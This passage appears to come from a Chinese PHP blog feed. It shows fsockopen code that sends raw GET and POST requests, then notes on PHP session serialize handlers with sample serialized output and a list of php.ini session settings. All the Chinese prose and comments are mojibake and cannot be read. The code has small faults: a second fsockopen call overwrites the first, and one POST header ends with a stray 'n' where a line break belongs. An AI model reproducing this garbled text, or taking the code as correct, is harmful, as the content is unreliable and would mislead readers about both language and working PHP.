//å–å‡ºæ‹¿åˆ°çš„æ•°æ®æ”¾åœ¨å­—ç¬¦ä¸²ä¸­</span><br><span class="line">    &#125;</span><br><span class="line">    echo $result;  //è¾“å‡º</span><br><span class="line">    fclose($fp);  //å…³é—­æ–‡ä»¶æŒ‡é’ˆ</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X03-fsockopen"><a href="#0X03-fsockopen" class="headerlink" title="0X03 fsockopen"></a>0X03 fsockopen</h3><h5 id="fsockopen-å‡½æ•°"><a href="#fsockopen-å‡½æ•°" class="headerlink" title="fsockopen()å‡½æ•°"></a>fsockopen()å‡½æ•°</h5><ul>
<li>æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnixå¥—æ¥å­—è¿æ¥</li>
<li>å®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.php.net/manual/zh/function.fsockopen.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.fsockopen.php</a></li>
<li>â–² 2020.03.16 èƒ½å®šåˆ¶ä»»æ„çš„è¿æ¥ï¼Œä½†ä½œä¸ºç½‘ç»œæŠ“å–çš„æˆæœæ˜¯ä¸ç†æƒ³çš„ã€‚è‹¥è¦åšç½‘ç»œæŠ“å–ï¼Œéœ€è¦å†™å®Œæ•´çš„httpè¯·æ±‚å¹¶å®šåˆ¶å›é€çš„httpè¯·æ±‚</li>
<li>â–² 2020.03.16 å­˜åœ¨wafï¼Œå¾ˆéš¾å‘é€æ­£å¸¸çš„æ•°æ®</li>
</ul>
<h5 id="parse-url-å‡½æ•°"><a href="#parse-url-å‡½æ•°" class="headerlink" title="parse_url()å‡½æ•°"></a>parse_url()å‡½æ•°</h5><ul>
<li>è§£æä¸€ä¸ªURLå¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†</li>
<li>å®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.php.net/manual/zh/function.parse-url.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.parse-url.php</a></li>
<li>â–² 2020.03.16 æ­¤å‡½æ•°å¯¹å…¶ä»–urlä¸­æœªæœ‰çš„å‚æ•°ä¸ä¼šè¿›è¡Œé»˜è®¤è®¾ç½®</li>
</ul>
<h5 id="æ¨¡æ‹ŸGETè¯·æ±‚-2"><a href="#æ¨¡æ‹ŸGETè¯·æ±‚-2" class="headerlink" title="æ¨¡æ‹ŸGETè¯·æ±‚"></a>æ¨¡æ‹ŸGETè¯·æ±‚</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = array(&apos;host&apos; =&gt; &apos;www.wyu.cn&apos;, &apos;port&apos; =&gt; &apos;80&apos;,&apos;path&apos; =&gt; &apos;&apos;,&apos;query&apos;=&gt; &apos;/&apos; ,&apos;cookie&apos; =&gt; &apos;/&apos;);  //è¯·æ±‚çš„urlæ•°ç»„</span><br><span class="line">    $fp = fsockopen($url[&apos;host&apos;],$url[&apos;port&apos;],$errno,$errstr,10);  //æ‰“å¼€ä¸€ä¸ªsockè¿æ¥</span><br><span class="line">    $fp = fsockopen(&quot;ssl://&quot;.$url[&apos;host&apos;],$url[&apos;port&apos;],$errno,$errstr,10);</span><br><span class="line">    //å¯¹httpsè¿æ¥çš„æ”¯æŒ</span><br><span class="line"></span><br><span class="line">    if(!$fp)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //å¦‚æœæ–‡ä»¶æŒ‡é’ˆä¸å­˜åœ¨ï¼Œå°±è¾“å‡ºæŠ¥é”™</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        $out = &quot;GET /$url[path] HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out.= &quot;Host: 61.160.224.50:80\r\n&quot;;</span><br><span class="line">        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;</span><br><span class="line">        $out.= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;</span><br><span class="line">        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;</span><br><span class="line">        fwrite($fp,$out);  //å°†httpçš„å¤´å†™å…¥æ–‡ä»¶æŒ‡é’ˆ</span><br><span class="line">        while(!feof($fp))  //feof()åˆ¤æ–­æ–‡ä»¶æŒ‡é’ˆæ˜¯å¦åˆ°æ–‡ä»¶åº•éƒ¨</span><br><span class="line">        &#123;</span><br><span class="line">            echo fgets($fp,1024);  //å–å‡ºæ‹¿åˆ°çš„æ•°æ®æ”¾åœ¨å­—ç¬¦ä¸²ä¸­</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);  //å…³é—­æ–‡ä»¶æŒ‡é’ˆ</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="æ¨¡æ‹ŸPOSTè¯·æ±‚-1"><a href="#æ¨¡æ‹ŸPOSTè¯·æ±‚-1" class="headerlink" title="æ¨¡æ‹ŸPOSTè¯·æ±‚"></a>æ¨¡æ‹ŸPOSTè¯·æ±‚</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn&apos;;  //è¦æŠ“å–çš„url</span><br><span class="line">    $url_info = parse_url($url);  //å¯¹urlè¿›è¡Œå­—æ®µè§£æ</span><br><span class="line"></span><br><span class="line">    $fp = fsockopen($url_info[&apos;host&apos;],80,$errno,$errstr,10);  ////æ‰“å¼€ä¸€ä¸ªsockè¿æ¥</span><br><span class="line"></span><br><span class="line">    $data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;number&apos; =&gt; &apos;7&apos;</span><br><span class="line">    );  //è¦å‘é€çš„postæ•°æ®</span><br><span class="line"></span><br><span class="line">    $post_data = http_build_query($data);  //url-encodeç¼–ç è¦postçš„æ•°æ®</span><br><span class="line"></span><br><span class="line">    if(!$fp)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //å¦‚æœæ–‡ä»¶æŒ‡é’ˆä¸å­˜åœ¨ï¼Œå°±è¾“å‡ºæŠ¥é”™</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        $out = &quot;POST &quot;.$url_info[&apos;path&apos;].&quot; HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out.= &quot;Host: &quot;.$url_info[&apos;host&apos;].&quot;\r\n&quot;;</span><br><span class="line">        $out.= &quot;Content-type: application/x-www-form-urlencodedn&quot;;</span><br><span class="line">        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;</span><br><span class="line">        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;</span><br><span class="line">        $out.= &quot;$post_data\r\n&quot;;</span><br><span class="line">        fwrite($fp,$out);  //å°†httpçš„å¤´å†™å…¥æ–‡ä»¶æŒ‡é’ˆ</span><br><span class="line">        while(!feof($fp))  //feof()åˆ¤æ–­æ–‡ä»¶æŒ‡é’ˆæ˜¯å¦åˆ°æ–‡ä»¶åº•éƒ¨</span><br><span class="line">        &#123;</span><br><span class="line">            echo fgets($fp,1024);  //å–å‡ºæ‹¿åˆ°çš„æ•°æ®æ”¾åœ¨å­—ç¬¦ä¸²ä¸­</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);  //å…³é—­æ–‡ä»¶æŒ‡é’ˆ</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>php session</title>
    <url>/2020/07/12/php_session/</url>
    <content><![CDATA[<hr>
<h2 id="php-session"><a href="#php-session" class="headerlink" title="php session"></a>php session</h2><ul>
<li>ä»€ä¹ˆæ˜¯php session<ul>
<li>session</li>
<li>php session</li>
<li>æ¥è‡ªå®˜æ–¹çš„è§£é‡Š</li>
</ul>
</li>
<li>php sessionçš„å­˜å‚¨æœºåˆ¶<ul>
<li>phpå¤„ç†å™¨</li>
</ul>
</li>
<li>php sessionåœ¨php.iniä¸­ä¸»è¦å­˜åœ¨çš„é…ç½®é¡¹</li>
</ul>
<h3 id="0X00-ä»€ä¹ˆæ˜¯php-session"><a href="#0X00-ä»€ä¹ˆæ˜¯php-session" class="headerlink" title="0X00 ä»€ä¹ˆæ˜¯php session"></a>0X00 ä»€ä¹ˆæ˜¯php session</h3><h5 id="session"><a href="#session" class="headerlink" title="session"></a>session</h5><ul>
<li>sessionä¸€èˆ¬ç§°ä¸ºâ€ä¼šè¯æ§åˆ¶â€ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ˜¯ä¸€ç§å®¢æˆ·ä¸ç½‘ç«™/æœåŠ¡å™¨æ›´ä¸ºå®‰å…¨çš„å¯¹è¯æ–¹å¼</li>
<li>ä¸€æ—¦å¼€å¯äº†sessionä¼šè¯ï¼Œä¾¿å¯ä»¥åœ¨ç½‘ç«™çš„ä»»ä½•é¡µé¢ä½¿ç”¨æˆ–ä¿æŒè¿™ä¸ªä¼šè¯ï¼Œä»è€Œè®©è®¿é—®è€…ä¸ç½‘ç«™ä¹‹é—´å»ºç«‹äº†ä¸€ç§â€å¯¹è¯â€æœºåˆ¶</li>
<li>ä¸åŒè¯­è¨€çš„ä¼šè¯æœºåˆ¶å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œè¿™é‡Œä»…è®¨è®ºphp sessionæœºåˆ¶</li>
</ul>
<h5 id="php-session-1"><a href="#php-session-1" class="headerlink" title="php session"></a>php session</h5><ul>
<li>php sessionå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å˜é‡ï¼Œä¸”è¯¥å˜é‡æ˜¯ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯çš„ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯çš„è®¾ç½®</li>
<li>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œphp sessionå˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¹¶ä¸”å¯¹äºåº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰é¡µé¢éƒ½æ˜¯å¯ç”¨çš„ï¼Œä¸”å…¶å¯¹åº”çš„å…·ä½“sessionå€¼ä¼šå­˜å‚¨äºæœåŠ¡å™¨ç«¯ï¼Œè¿™ä¹Ÿæ˜¯ä¸cookieçš„ä¸»è¦åŒºåˆ«ï¼Œæ‰€ä»¥seesionçš„å®‰å…¨æ€§ç›¸å¯¹è¾ƒé«˜</li>
</ul>
<h5 id="æ¥è‡ªå®˜æ–¹çš„è§£é‡Š"><a href="#æ¥è‡ªå®˜æ–¹çš„è§£é‡Š" class="headerlink" title="æ¥è‡ªå®˜æ–¹çš„è§£é‡Š"></a>æ¥è‡ªå®˜æ–¹çš„è§£é‡Š</h5><ul>
<li><p>é€šè¿‡ä¸ºæ¯ä¸ªç‹¬ç«‹ç”¨æˆ·åˆ†é…å”¯ä¸€çš„ä¼šè¯IDï¼Œå¯ä»¥å®ç°é’ˆå¯¹ä¸åŒç”¨æˆ·åˆ†åˆ«å­˜å‚¨æ•°æ®çš„åŠŸèƒ½ã€‚ ä¼šè¯é€šå¸¸è¢«ç”¨æ¥åœ¨å¤šä¸ªé¡µé¢è¯·æ±‚ä¹‹é—´ä¿å­˜åŠå…±äº«ä¿¡æ¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¼šè¯IDé€šè¿‡cookieçš„æ–¹å¼å‘é€åˆ°æµè§ˆå™¨ï¼Œå¹¶ä¸”åœ¨æœåŠ¡å™¨ç«¯ä¹Ÿæ˜¯é€šè¿‡ä¼šè¯IDæ¥å–å›ä¼šè¯ä¸­çš„æ•°æ®ã€‚å¦‚æœè¯·æ±‚ä¸­ä¸åŒ…å«ä¼šè¯IDä¿¡æ¯ï¼Œé‚£ä¹ˆ PHPå°±ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œå¹¶ä¸ºæ–°åˆ›å»ºçš„ä¼šè¯åˆ†é…æ–°çš„ID</p>
</li>
<li><p>ä¼šè¯çš„å·¥ä½œæµç¨‹å¾ˆç®€å•ã€‚å½“å¼€å§‹ä¸€ä¸ªä¼šè¯æ—¶ï¼ŒPHPä¼šå°è¯•ä»è¯·æ±‚ä¸­æŸ¥æ‰¾ä¼šè¯IDï¼ˆé€šå¸¸é€šè¿‡ä¼šè¯ cookieï¼‰ï¼Œ å¦‚æœè¯·æ±‚ä¸­ä¸åŒ…å«ä¼šè¯IDä¿¡æ¯ï¼ŒPHPå°±ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ï¼ˆphp_session_create_idï¼‰ã€‚ä¼šè¯å¼€å§‹ä¹‹åï¼ŒPHPå°±ä¼šå°†ä¼šè¯ä¸­çš„æ•°æ®è®¾ç½®åˆ°<code>$_SESSION</code>å˜é‡ä¸­ï¼ˆåœ¨http responseä¸­é€šè¿‡set-cookieå¤´éƒ¨å‘é€ç»™å®¢æˆ·ç«¯ä¿å­˜ï¼‰ã€‚å½“PHPåœæ­¢çš„æ—¶å€™ï¼Œå®ƒä¼šè‡ªåŠ¨è¯»å–<code>$_SESSION</code>ä¸­çš„å†…å®¹ï¼Œå¹¶å°†å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œ ç„¶åå‘é€ç»™ä¼šè¯ä¿å­˜ç®¡ç†å™¨æ¥è¿›è¡Œä¿å­˜</p>
</li>
<li><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒPHPä½¿ç”¨å†…ç½®çš„æ–‡ä»¶ä¼šè¯ä¿å­˜ç®¡ç†å™¨ï¼ˆfilesï¼‰æ¥å®Œæˆä¼šè¯çš„ä¿å­˜ã€‚ä¹Ÿå¯ä»¥é€šè¿‡é…ç½®é¡¹<code>session.save_handler</code>æ¥ä¿®æ”¹æ‰€è¦é‡‡ç”¨çš„ä¼šè¯ä¿å­˜ç®¡ç†å™¨ã€‚å¯¹äºæ–‡ä»¶ä¼šè¯ä¿å­˜ç®¡ç†å™¨ï¼Œä¼šå°†ä¼šè¯æ•°æ®ä¿å­˜åˆ°é…ç½®é¡¹<code>session.save_path</code>æ‰€æŒ‡å®šçš„ä½ç½® </p>
</li>
<li><p>å¯ä»¥é€šè¿‡è°ƒç”¨å‡½æ•°<code>session_start()</code>æ¥æ‰‹åŠ¨å¼€å§‹ä¸€ä¸ªä¼šè¯ã€‚ å¦‚æœé…ç½®é¡¹<code>session.auto_start</code>è®¾ç½®ä¸º1ï¼Œ é‚£ä¹ˆè¯·æ±‚å¼€å§‹çš„æ—¶å€™ï¼Œä¼šè¯ä¼šè‡ªåŠ¨å¼€å§‹</p>
</li>
<li><p>PHPè„šæœ¬æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œä¼šè¯ä¼šè‡ªåŠ¨å…³é—­ã€‚ åŒæ—¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è°ƒç”¨å‡½æ•°<code>session_write_close()</code>æ¥æ‰‹åŠ¨å…³é—­ä¼šè¯</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">  $_SESSION[&apos;username&apos;] = &apos;xianzhi&apos; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/cookie&session&token/process.png" alt="process"></p>
<h3 id="0X01-php-sessionçš„å­˜å‚¨æœºåˆ¶"><a href="#0X01-php-sessionçš„å­˜å‚¨æœºåˆ¶" class="headerlink" title="0X01 php sessionçš„å­˜å‚¨æœºåˆ¶"></a>0X01 php sessionçš„å­˜å‚¨æœºåˆ¶</h3><ul>
<li>php sessionçš„å­˜å‚¨æœºåˆ¶æ˜¯ç”±session.serialize_handleræ¥å®šä¹‰å¼•æ“çš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ï¼Œä¸”å­˜å‚¨çš„æ–‡ä»¶æ˜¯ç”±sess_sessionidæ¥å†³å®šæ–‡ä»¶åçš„</li>
<li>session.serialize_handlerå®šä¹‰çš„å¼•æ“æœ‰ä¸‰ç§<ul>
<li>è‡ªPHP 5.5.4èµ·å¯ä»¥ä½¿ç”¨php_serialize</li>
<li>ä¸Šè¿°ä¸‰ç§å¤„ç†å™¨ä¸­ï¼Œphp_serializeåœ¨å†…éƒ¨ç®€å•åœ°ç›´æ¥ä½¿ç”¨serialize/unserializeå‡½æ•°ï¼Œå¹¶ä¸”ä¸ä¼šæœ‰phpå’Œphp_binaryæ‰€å…·æœ‰çš„é™åˆ¶ã€‚ä½¿ç”¨è¾ƒæ—§çš„åºåˆ—åŒ–å¤„ç†å™¨å¯¼è‡´$_SESSIONçš„ç´¢å¼•æ—¢ä¸èƒ½æ˜¯æ•°å­—ä¹Ÿä¸èƒ½åŒ…å«ç‰¹æ®Šå­—ç¬¦(| å’Œ !)</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">å¤„ç†å™¨åç§°</th>
<th align="center">å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php</td>
<td align="center">é”®å</td>
</tr>
<tr>
<td align="center">php_binary</td>
<td align="center">é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td align="center">php_serialize</td>
<td align="center">ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°æ®</td>
</tr>
</tbody></table>
<h5 id="phpå¤„ç†å™¨"><a href="#phpå¤„ç†å™¨" class="headerlink" title="phpå¤„ç†å™¨"></a>phpå¤„ç†å™¨</h5><ul>
<li>session.serialize_handlerç­‰äºphpæ—¶å€™çš„åºåˆ—åŒ–ç»“æœ<ul>
<li>sessionä¸º$_SESSION[â€˜sessionâ€™]çš„é”®åï¼Œ|åä¸ºä¼ å…¥GETå‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    ini_set(&apos;session.serialize_handler&apos;,&apos;php&apos;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;username&apos;] = &apos;xianzhi&apos; ;  //username|s:7:&quot;xianzhi&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>session.serialize_handlerç­‰äºphp_binaryæ—¶å€™çš„åºåˆ—åŒ–ç»“æœ<ul>
<li>#ä¸ºé”®åé•¿åº¦å¯¹åº”çš„ASCIIçš„å€¼ï¼Œsessionsessionsessionsessionsessionsä¸ºé”®åï¼Œs:7:â€xianzhiâ€;ä¸ºä¼ å…¥GETå‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    ini_set(&apos;session.serialize_handler&apos;,&apos;php_binary&apos;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;sessionsessionsessionsessionsessions&apos;] = &apos;xianzhi&apos; ;   //#sessionsessionsessionsessionsessions:7:&quot;xianzhi&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>session.serialize_handlerç­‰äºphp_serializeæ—¶å€™çš„åºåˆ—åŒ–ç»“æœ<ul>
<li>a:1è¡¨ç¤º$_SESSIONæ•°ç»„ä¸­æœ‰1ä¸ªå…ƒç´ ï¼ŒèŠ±æ‹¬å·é‡Œé¢å†…å®¹å³ä¸ºä¼ å…¥GETå‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;username&apos;] = &apos;xianzhi&apos; ;  //a:1:&#123;s:8:&quot;username&quot;;s:7:&quot;xianzhi&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X02-php-sessionåœ¨php-iniä¸­ä¸»è¦å­˜åœ¨çš„é…ç½®é¡¹"><a href="#0X02-php-sessionåœ¨php-iniä¸­ä¸»è¦å­˜åœ¨çš„é…ç½®é¡¹" class="headerlink" title="0X02 php sessionåœ¨php.iniä¸­ä¸»è¦å­˜åœ¨çš„é…ç½®é¡¹"></a>0X02 php sessionåœ¨php.iniä¸­ä¸»è¦å­˜åœ¨çš„é…ç½®é¡¹</h3><ul>
<li><p>session.gc_divisorï¼šphp sessionåƒåœ¾å›æ”¶æœºåˆ¶ç›¸å…³é…ç½®</p>
</li>
<li><p>session.sid_bits_per_characterï¼šæŒ‡å®šç¼–ç çš„ä¼šè¯IDå­—ç¬¦ä¸­çš„ä½æ•°</p>
</li>
<li><p>session.save_path=â€â€ï¼šè¯¥é…ç½®ä¸»è¦è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„</p>
</li>
<li><p>session.save_handler=â€â€ï¼šè¯¥é…ç½®ä¸»è¦è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®sessionå­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°</p>
</li>
<li><p>session.use_strict_modeï¼šä¸¥æ ¼ä¼šè¯æ¨¡å¼ï¼Œä¸¥æ ¼ä¼šè¯æ¨¡å¼ä¸æ¥å—æœªåˆå§‹åŒ–çš„ä¼šè¯IDå¹¶é‡æ–°ç”Ÿæˆä¼šè¯ID</p>
</li>
<li><p>session.use_cookiesï¼šæŒ‡å®šæ˜¯å¦åœ¨å®¢æˆ·ç«¯ç”¨cookieæ¥å­˜æ”¾ä¼šè¯IDï¼Œé»˜è®¤å¯ç”¨</p>
</li>
<li><p>session.cookie_secureï¼šæŒ‡å®šæ˜¯å¦ä»…é€šè¿‡å®‰å…¨è¿æ¥å‘é€cookieï¼Œé»˜è®¤å…³é—­</p>
</li>
<li><p>session.use_only_cookiesï¼šæŒ‡å®šæ˜¯å¦åœ¨å®¢æˆ·ç«¯ä»…ä»…ä½¿ç”¨cookieæ¥å­˜æ”¾ä¼šè¯IDï¼Œå¯ç”¨çš„è¯ï¼Œå¯ä»¥é˜²æ­¢æœ‰å…³é€šè¿‡URLä¼ é€’ä¼šè¯IDçš„æ”»å‡»</p>
</li>
<li><p>session.nameï¼šæŒ‡å®šä¼šè¯åä»¥ç”¨åšcookieçš„åå­—ï¼Œåªèƒ½ç”±å­—æ¯æ•°å­—ç»„æˆï¼Œé»˜è®¤ä¸ºPHPSESSID</p>
</li>
<li><p>session.auto_startï¼šæŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤å€¼ä¸º0ï¼Œä¸å¯åŠ¨</p>
</li>
<li><p>session.cookie_lifetimeï¼šæŒ‡å®šäº†å‘é€åˆ°æµè§ˆå™¨çš„cookieçš„ç”Ÿå‘½å‘¨æœŸï¼Œå•ä½ä¸ºç§’ï¼Œå€¼ä¸º0 è¡¨ç¤ºâ€ç›´åˆ°å…³é—­æµè§ˆå™¨â€é»˜è®¤ä¸º0</p>
</li>
<li><p>session.cookie_pathï¼šæŒ‡å®šè¦è®¾ç½®ä¼šè¯cookie çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º /</p>
</li>
<li><p>session.cookie_domainï¼šæŒ‡å®šè¦è®¾ç½®ä¼šè¯cookie çš„åŸŸåï¼Œé»˜è®¤ä¸ºæ— ï¼Œè¡¨ç¤ºæ ¹æ® cookie è§„èŒƒäº§ç”Ÿcookieçš„ä¸»æœºå</p>
</li>
<li><p>session.cookie_httponlyï¼šå°†Cookieæ ‡è®°ä¸ºåªèƒ½é€šè¿‡HTTPåè®®è®¿é—®ï¼Œå³æ— æ³•é€šè¿‡è„šæœ¬è¯­è¨€ï¼ˆä¾‹å¦‚JavaScriptï¼‰è®¿é—®Cookieï¼Œæ­¤è®¾ç½®å¯ä»¥æœ‰æ•ˆåœ°å¸®åŠ©é€šè¿‡XSSæ”»å‡»å‡å°‘èº«ä»½ç›—ç”¨</p>
</li>
<li><p>session.serialize_handlerï¼šå®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ï¼Œé»˜è®¤ä½¿ç”¨phpï¼Œè¿˜æœ‰å…¶ä»–å¼•æ“ï¼Œä¸”ä¸åŒå¼•æ“çš„å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒï¼Œå…·ä½“å¯è§ä¸‹æ–‡æ‰€è¿°</p>
</li>
<li><p>session.gc_probabilityï¼šè¯¥é…ç½®é¡¹ä¸session.gc_divisoråˆèµ·æ¥ç”¨æ¥ç®¡ç†garbagecollectionï¼Œå³åƒåœ¾å›æ”¶è¿›ç¨‹å¯åŠ¨çš„æ¦‚ç‡</p>
</li>
<li><p>session.gc_divisorï¼šè¯¥é…ç½®é¡¹ä¸session.gc_probabilityåˆèµ·æ¥å®šä¹‰äº†åœ¨æ¯ä¸ªä¼šè¯åˆå§‹åŒ–æ—¶å¯åŠ¨åƒåœ¾å›æ”¶è¿›ç¨‹çš„æ¦‚ç‡</p>
</li>
<li><p>session.gc_maxlifetimeï¼šæŒ‡å®šè¿‡äº†å¤šå°‘ç§’ä¹‹åæ•°æ®å°±ä¼šè¢«è§†ä¸ºâ€œåƒåœ¾â€å¹¶è¢«æ¸…é™¤ï¼Œåƒåœ¾æœé›†å¯èƒ½ä¼šåœ¨sessionå¯åŠ¨çš„æ—¶å€™å¼€å§‹ï¼ˆå–å†³äºsession.gc_probabilityå’Œsession.gc_divisorï¼‰</p>
</li>
<li><p>session.referer_checkï¼šåŒ…å«æœ‰ç”¨æ¥æ£€æŸ¥æ¯ä¸ªHTTPRefererçš„å­ä¸²ã€‚å¦‚æœå®¢æˆ·ç«¯å‘é€äº†Refererä¿¡æ¯ä½†æ˜¯åœ¨å…¶ä¸­å¹¶æœªæ‰¾åˆ°è¯¥å­ä¸²ï¼Œåˆ™åµŒå…¥çš„ä¼šè¯ ID ä¼šè¢«æ ‡è®°ä¸ºæ— æ•ˆã€‚é»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²</p>
</li>
<li><p>session.cache_limiterï¼šæŒ‡å®šä¼šè¯é¡µé¢æ‰€ä½¿ç”¨çš„ç¼“å†²æ§åˆ¶æ–¹æ³•ï¼ˆnone/nocache/private/private_no_expire/publicï¼‰é»˜è®¤ä¸ºnocache</p>
</li>
<li><p>session.cache_expireï¼šä»¥åˆ†é’Ÿæ•°æŒ‡å®šç¼“å†²çš„ä¼šè¯é¡µé¢çš„å­˜æ´»æœŸï¼Œæ­¤è®¾å®šå¯¹nocacheç¼“å†²æ§åˆ¶æ–¹æ³•æ— æ•ˆã€‚é»˜è®¤ä¸º 180</p>
</li>
<li><p>session.use_trans_sidï¼šæŒ‡å®šæ˜¯å¦å¯ç”¨é€æ˜SIDæ”¯æŒã€‚é»˜è®¤ç¦ç”¨</p>
</li>
<li><p>session.sid_lengthï¼šé…ç½®ä¼šè¯IDå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ä¼šè¯IDçš„é•¿åº¦å¯ä»¥åœ¨22åˆ°256ä¹‹é—´ã€‚é»˜è®¤å€¼ä¸º32</p>
</li>
<li><p>session.trans_sid_tagsï¼šæŒ‡å®šå¯ç”¨é€æ˜sidæ”¯æŒæ—¶é‡å†™å“ªäº›HTMLæ ‡ç­¾ä»¥åŒ…æ‹¬ä¼šè¯ID</p>
</li>
<li><p>session.trans_sid_hostsï¼šæŒ‡å®šå¯ç”¨é€æ˜sidæ”¯æŒæ—¶é‡å†™çš„ä¸»æœºï¼Œä»¥åŒ…æ‹¬ä¼šè¯ID</p>
</li>
<li><p>session.sid_bits_per_characterï¼šé…ç½®ç¼–ç çš„ä¼šè¯IDå­—ç¬¦ä¸­çš„ä½æ•°</p>
</li>
<li><p>session.upload_progress.enabledï¼šå¯ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$_SESSIONå˜é‡ï¼Œ é»˜è®¤å¯ç”¨</p>
</li>
